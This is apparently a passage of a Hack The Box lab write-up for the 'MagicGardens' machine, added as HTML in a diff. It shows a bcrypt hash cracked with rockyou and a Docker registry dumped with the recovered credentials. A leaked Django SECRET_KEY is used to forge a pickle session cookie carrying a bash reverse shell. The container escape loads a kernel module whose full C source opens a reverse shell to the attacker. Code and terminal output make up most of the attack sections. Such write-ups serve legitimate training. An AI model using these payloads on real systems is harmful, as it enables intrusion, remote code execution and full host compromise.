+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2y$05$KKShqNw.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhH...2Pa5Hq
+Time.Started.....: Mon Feb  3 13:56:00 2025 (1 sec)
+Time.Estimated...: Mon Feb  3 13:56:01 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     1101 H/s (6.89ms) @ Accel:4 Loops:16 Thr:1 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 944/14344385 (0.01%)
+Rejected.........: 0/944 (0.00%)
+Restore.Point....: 928/14344385 (0.01%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:16-32
+Candidate.Engine.: Device Generator
+Candidates.#1....: xbox360 -&gt; diamonds
+Hardware.Mon.#1..: Temp: 61c Util: 92%
+
+Started: Mon Feb  3 13:55:53 2025
+Stopped: Mon Feb  3 13:56:02 2025
+
+</code></pre>
+</div></div>
+<br><br>
+<h3>Docker Registry:</h3>
+<ul class="bulleted-list"><li style="list-style-type:disc">During our initial <strong>Nmap scan</strong>, we identified an <strong>HTTPS Docker Registry (v2.0)</strong> running on <strong>port 5000</strong>.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">From <a href="https://book.hacktricks.wiki/en/network-services-pentesting/5000-pentesting-docker-registry.html">Hacktricks</a>, we learned about common enumeration techniques for <strong>Docker Registry</strong>.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Checking for accessible directories, we found <code>/v2</code>, which requires authentication (username and password).</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Since we previously found <strong>credentials</strong> (<code>AlexMiles:diamonds</code>), we can attempt to dump the <strong>Docker Registry</strong>.</li></ul>
+<br><br>
+<h3>Using Docker Registry Grabber:</h3>
+<p><a href="https://github.com/Syzik/DockerRegistryGrabber">DockerRegistryGrabber</a> is a Python tool that allows enumeration and dumping of <strong>Docker Registries</strong>, both with and without authentication.</p><p>We used the following command to dump the registry:</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>python3 /opt/DockerRegistryGrabber/drg.py https://magicgardens.htb -U AlexMiles -P diamonds --dump magicgardens.htb
+[+] BlobSum found 32
+[+] Dumping magicgardens.htb
+    [+] Downloading : d3a3443a740ae9a727dbd8868b751b492da27507f3cbbe0965982e65c436b8c0
+    [+] Downloading : 2ed799371a1863449219ad8510767e894da4c1364f94701e7a26cc983aaf4ca6
+    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+    [+] Downloading : b0c11cc482abe59dbeea1133c92720f7a3feca9c837d75fd76936b1c6243938c
+    [+] Downloading : 748da8c1b87e668267b90ea305e2671b22d046dcfeb189152bf590d594c3b3fc
+    [+] Downloading : 81771b31efb313fb18dae7d8ca3a93c8c4554aa09239e09d61bbbc7ed58d4515
+    [+] Downloading : 35b21a215463f8130302987a1954d01a8346cdd82c861d57eeb3cfb94d6511a8
+    [+] Downloading : 437853d7b910e50d0a0a43b077da00948a21289a32e6ce082eb4d44593768eb1
+    [+] Downloading : f9afd820562f8d93873f4dfed53f9065b928c552cf920e52e804177eff8b2c82
+    [+] Downloading : d66316738a2760996cb59c8eb2b28c8fa10a73ce1d98fb75fda66071a1c659d6
+    [+] Downloading : fedbb0514db0150f2376b0f778e5f304c302b53619b96a08824c50da7e3e97ea
+    [+] Downloading : 480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb
+    [+] Downloading : 02cea9e48b60ccaf6476be25bac7b982d97ef0ed66baeb8b0cffad643ece37d5
+    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+    [+] Downloading : 8999ec22cbc0ab31d0e3471d591538ff6b2b4c3bbace9c2a97e6c68844382a78
+    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+    [+] Downloading : 470924304c244ba833543bb487c73e232fd34623cdbfa51d30eab30ce802a10d
+    [+] Downloading : 4bc8eb4a36a30acad7a56cf0b58b279b14fce7dd6623717f32896ea748774a59
+    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+    [+] Downloading : 9c94b131279a02de1f5c2eb72e9cda9830b128840470843e0761a45d7bebbefe
+    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+    [+] Downloading : c485c4ba383179db59368a8a4d2df3e783620647fe0b014331c7fd2bd8526e5b
+    [+] Downloading : 9b1fd34c30b75e7edb20c2fd09a9862697f302ef9ae357e521ef3c84d5534e3f
+    [+] Downloading : d31b0195ec5f04dfc78eca9d73b5d223fc36a29f54ee888bc4e0615b5839e692
+    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+    [+] Downloading : de4cac68b6165c40cf6f8b30417948c31be03a968e233e55ee40221553a5e570
+</code></pre>
+</div></div>
+<br><br>
+<ul><li style="list-style-type:disc">After dumping the <strong>Docker Registry</strong>, we need to inspect the extracted <strong>tar.gz</strong> files for any sensitive information related to the user <strong>morty</strong>.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">We use the following command to search for files containing the keyword <strong>morty</strong> inside the archives:</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">After identifying <strong>tar.gz</strong> files containing references to <code>morty</code>, we extracted each archive to analyze its contents.</li></ul>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>zgrep -la morty *.tar.gz    
+2ed799371a1863449219ad8510767e894da4c1364f94701e7a26cc983aaf4ca6.tar.gz
+480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb.tar.gz
+b0c11cc482abe59dbeea1133c92720f7a3feca9c837d75fd76936b1c6243938c.tar.gz
+d3a3443a740ae9a727dbd8868b751b492da27507f3cbbe0965982e65c436b8c0.tar.gz
+qd66316738a2760996cb59c8eb2b28c8fa10a73ce1d98fb75fda66071a1c659d6.tar.gz</code></pre>
+</div></div>
+<br><br>
+<p>From the second file:</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>┌──(python_env)─(deepak㉿kali)-[~/…/Insane_Linux/MagicGardens/docker_dump/magicgardens.htb]
+└─$ tar -xf 480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb.tar</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">During the inspection, we found a <strong>.env</strong> file that contained a <strong>SECRET_KEY</strong>.</li></ul>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>┌──(python_env)─(deepak㉿kali)-[~/…/magicgardens.htb/usr/src/app]
+└─$ ls -la
+total 204
+drwxr-xr-x 6 deepak deepak   4096 Aug 28  2023 .
+drwxr-xr-x 3 deepak deepak   4096 Aug 28  2023 ..
+drwxr-x--- 3 deepak deepak   4096 Aug 11  2023 app
+-rwxr-x--- 1 deepak deepak 176128 Aug 11  2023 db.sqlite3
+-rwxr-x--- 1 deepak deepak     97 Aug 11  2023 .env
+-rwxr-x--- 1 deepak deepak    561 Aug 11  2023 manage.py
+drwxr-x--- 3 deepak deepak   4096 Aug 11  2023 media
+drwxr-x--- 4 deepak deepak   4096 Aug 11  2023 static
+drwxr-x--- 6 deepak deepak   4096 Aug 11  2023 store
+                                                                                                                                                                                                                                              
+┌──(python_env)─(deepak㉿kali)-[~/…/magicgardens.htb/usr/src/app]
+└─$ cat .env                  
+DEBUG=False
+SECRET_KEY=55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&amp;87b</code></pre>
+</div></div>
+<br><br>
+<h3><strong>Django Serialization Exploit:</strong></h3>
+<ul><li style="list-style-type:disc"> In Django, the <strong>SECRET_KEY</strong> is used to sign session cookies, ensuring their integrity and preventing tampering. If an attacker gains access to the <code>SECRET_KEY</code>, they can forge valid session cookies, potentially hijacking user sessions and gaining unauthorized access.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Through random searching, I discovered that Django has a serialization exploit that can be used to execute arbitrary code.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">We leverage Django&#x27;s <strong>PickleSerializer</strong> along with the leaked <code>SECRET_KEY</code> to generate a signed malicious session cookie.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">This allows us to inject and execute arbitrary commands on the target system.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">This is the <strong>reverse shell payload</strong> used</li></ul>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.90/4444 0&gt;&amp;1&#x27;</code></pre>
+        </div></div>
+        <br><br>
+        <ul class="bulleted-list"><li style="list-style-type:disc">To encode your reverse shell in Base64, replace the IP and port with your own and run:</li></ul>
+        <br><br>
+        <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>from django.contrib.sessions.serializers import PickleSerializer
+from django.core import signing
+from django.conf import settings
+
+settings.configure(SECRET_KEY=&quot;55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&amp;87b&quot;)
+
+
+class CreateTmpFile(object):
+    def __reduce__(self):
+        import subprocess
+        return (subprocess.call,
+                ([&#x27;bash&#x27;,
+                  &#x27;-c&#x27;,&#x27;echo L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOTAvNDQ0NCAwPiYxJw== | b&gt;
+
+
+sess = signing.dumps(
+    obj=CreateTmpFile(),
+    serializer=PickleSerializer,
+    salt=&#x27;django.contrib.sessions.backends.signed_cookies&#x27;
+)
+
+
+print(sess)
+
+</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">This script generates a signed session token containing a <strong>reverse shell payload</strong>. Injecting this session into an authenticated request results in <strong>remote code execution (RCE)</strong>, granting us a reverse shell on the target.<br/><br/></li></ul>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>python3 serliaze.py                                    
+gAWVmgAAAAAAAACMCnN1YnByb2Nlc3OUjARjYWxslJOUXZQojARiYXNolIwCLWOUjGxlY2hvIEwySnBiaTlpWVhOb0lDMWpJQ2N2WW1sdUwySmhjMmdnTFdrZ1BpWWdMMlJsZGk5MFkzQXZNVEF1TVRBdU1UUXVPVEF2TkRRME5DQXdQaVl4Snc9PSB8IGJhc2U2NCAtZCB8IGJhc2iUZYWUUpQu:1tf07m:pwA7PcRcPofIcIanbm_JnTpEk-H_yP8Wz2ilp0WkcJA
+</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">After generating the serialized payload, we obtained the <strong>session ID</strong></li></ul><ul class="bulleted-list"><li style="list-style-type:disc">We then captured an <strong>authenticated request</strong> in <strong>Burp Suite</strong>, modified the <code>sessionid</code> cookie to the newly generated value, and forwarded the request.<br/><br/></li></ul>
+<br><br>
+<img src="./image 19.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<ul class="bulleted-list"><li style="list-style-type:disc">This successfully executed our <strong>reverse shell payload</strong>, granting us a shell on the target system.</li></ul>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>nc -lnvp 4444                                       
+listening on [any] 4444 ...
+connect to [10.10.14.90] from (UNKNOWN) [10.10.11.9] 37520
+bash: cannot set terminal process group (16): Inappropriate ioctl for device
+bash: no job control in this shell
+root@5e5026ac6a81:</code></pre>
+</div></div>
+</section>
+
+<section id="Privilege Escalation" class="section">
+<h2> Privilege Escalation:</h2>
+<ul class="bulleted-list"><li style="list-style-type:disc">Even though we obtained a root shell, we were still inside a Docker container.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Our next goal was to escape the container and gain access to the host system.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Run the following command inside the container to check the capabilities granted to the current user:</li></ul>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>root@5e5026ac6a81:/usr/src# capsh --print
+capsh --print
+Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_audit_write,cap_setfcap=ep
+Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_audit_write,cap_setfcap
+Ambient set =
+Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_mknod,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore
+Securebits: 00/0x0/1&#x27;b0 (no-new-privs=0)
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+ secure-no-ambient-raise: no (unlocked)
+uid=0(root) euid=0(root)
+gid=0(root)
+groups=0(root)
+Guessed mode: HYBRID (4)</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc"><strong>CAP_SYS_MODULE</strong> is enabled, it allows loading and unloading kernel modules, which can be exploited to escape the container and gain control over the host machine.</li></ul>
+<br><br>
+<h3>Exploiting CAP_SYS_MODULE for Container Escape:</h3><ul class="bulleted-list"><li style="list-style-type:disc">We discovered that the container had the <strong>CAP_SYS_MODULE</strong> capability enabled, which allows us to load and unload kernel modules.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">This is a major security risk because we can create a malicious kernel module that grants us full control over the host system.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">We created a <strong>kernel module</strong> that executes a reverse shell when loaded. The following <strong>C code</strong> was used to create the module:<br/><br/></li></ul><br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>#include &lt;linux/kmod.h&gt;
+#include &lt;linux/module.h&gt;
+MODULE_LICENSE(&quot;GPL&quot;);
+MODULE_AUTHOR(&quot;AttackDefense&quot;);
+MODULE_DESCRIPTION(&quot;LKM reverse shell module&quot;);
+MODULE_VERSION(&quot;1.0&quot;);
+
+char* argv[] = {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.27/4444 0&gt;&amp;1&quot;, NULL};
+static char* envp[] = {&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;, NULL };
+
+// call_usermodehelper function is used to create user mode processes from kernel space
+static int __init reverse_shell_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+static void __exit reverse_shell_exit(void) {
+    printk(KERN_INFO &quot;Exiting\n&quot;);
+}
+
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">Then created a <strong>Makefile</strong> to compile the module:</li></ul><br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>obj-m += reverse-shell.o
+
+KDIR := /lib/modules/$(shell uname -r)/build
+PWD := $(shell pwd)
+
+all:
+    $(MAKE) -C $(KDIR) M=$(PWD) modules
+
+clean:
+    $(MAKE) -C $(KDIR) M=$(PWD) clean
+</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">To compile the module, we ran:</li></ul>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>root@5e5026ac6a81:/usr/src# make
+make
+make: Warning: File &#x27;Makefile&#x27; has modification time 964 s in the future
+make -C /lib/modules/6.1.0-20-amd64/build M=/usr/src modules
+make[1]: Entering directory &#x27;/usr/src/linux-headers-6.1.0-20-amd64&#x27;
+make[2]: Warning: File &#x27;/usr/src/Makefile&#x27; has modification time 963 s in the future
+  CC [M]  /usr/src/reverse-shell.o
+make[2]: warning:  Clock skew detected.  Your build may be incomplete.
+make[2]: Warning: File &#x27;/usr/src/Makefile&#x27; has modification time 963 s in the future
+  MODPOST /usr/src/Module.symvers
+make[2]: warning:  Clock skew detected.  Your build may be incomplete.
+  CC [M]  /usr/src/reverse-shell.mod.o
+  LD [M]  /usr/src/reverse-shell.ko
+  BTF [M] /usr/src/reverse-shell.ko
+Skipping BTF generation for /usr/src/reverse-shell.ko due to unavailability of vmlinux
+make[1]: Leaving directory &#x27;/usr/src/linux-headers-6.1.0-20-amd64&#x27;
+make: warning:  Clock skew detected.  Your build may be incomplete.
+</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">After compiling, we loaded the module into the kernel using:</li></ul>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>root@5e5026ac6a81:/usr/src# insmod reverse-shell.ko
+insmod reverse-shell.ko</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">This executed our reverse shell payload, giving us access to the <strong>host machine</strong> as root.</li></ul>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>nc -lvnp 4444                      
+listening on [any] 4444 ...
+[1]  + continued  nc -lvnp 4444
+connect to [10.10.14.27] from (UNKNOWN) [10.10.11.9] 41100
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@magicgardens:/root# ls
+ls
+docker
+healthcheck.sh
+root.txt
+</code></pre>
+</div></div>
+</section>
+</div>
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
 <footer>
   <div class="copyright">
